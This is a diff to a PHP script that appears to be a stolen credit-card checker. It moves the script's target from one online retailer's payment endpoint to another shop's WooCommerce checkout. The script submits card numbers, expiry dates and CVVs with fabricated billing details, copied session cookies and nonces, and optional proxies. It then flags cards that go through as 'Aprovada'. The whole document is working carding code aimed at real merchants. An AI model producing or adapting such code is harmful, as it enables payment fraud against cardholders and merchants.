@@ -151,7 +151,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 20)), 0, 10);
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.wiredzone.com/payment/braintree/s2s/create_json_3ds');
+curl_setopt($ch, CURLOPT_URL, 'https://www.batteryyard.com.au/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -180,18 +180,18 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate, br',
+'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/json',
-'cookie: session_id=c20998faad887da34e3ea6abce9f00f9d9d59d9b; frontend_lang=en_US; im_livechat_history=["/legal/privacy-policy","/shop/category/accessories-kvm-138","/shop/category/accessories-kvm-138?order=list_price+asc&category=138","/shop/cart","/shop/address","/shop/payment","/","/shop?search=pin","/shop?order=list_price+asc&search=pin"]',
-'origin: https://www.wiredzone.com',
-'referer: https://www.wiredzone.com/shop/payment',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wplc_cid=SkJlDrXLu08_1593496383315; woocommerce_items_in_cart=1; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; woocommerce_cart_hash=b9c0cc9bba61665516d7343ea7a9d697',
+'origin: https://www.batteryyard.com.au',
+'referer: https://www.batteryyard.com.au/checkout/',
 'user-agent: '.$browser.'',
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"jsonrpc":"2.0","method":"call","params":{"data_set":"","acquirer_id":"11","return_url":"/shop/payment/validate","partner_id":"182706","csrf_token":"f4d013a1b56f6426de83c80271adbf1e6d5555e4o1592415295","cc_number":"'.$cc1.' '.$cc2.' '.$cc3.' '.$cc4.'","cc_brand":"visa","cc_holder_name":"Vincent Warner","cc_expiry":"'.$mes.' / '.$ano.'","cc_cvc":"'.$cvv.'","cc_street_address":"12 avenue","cc_postal_code":"33101","cc_country":"United States","cc_state":"Florida"},"id":'.$dbtime.'}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A21&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=15473866fd&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
@@ -207,7 +207,7 @@ curl_close($ch);
  // $token = trim(strip_tags(getstr($result,'<input name="__RequestVerificationToken" type="hidden" value="','" /></form>')));
 
 // echo $token;
-$message = trim(strip_tags(getstr($result,'"arguments": ["','", ""]')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
 // // $code = trim(strip_tags(getstr($result,'"message":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
@@ -233,7 +233,7 @@ $message = trim(strip_tags(getstr($result,'"arguments": ["','", ""]')));
 // // $brand = getStr($fim, '"brand":"','"');
 // // $type = trim(strip_tags(getstr($fim,'"type":"','"')));
 
-if(strpos($result,'"result": true')){
+if(strpos($result,'"result":"success"')){
 // updatecart();
       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
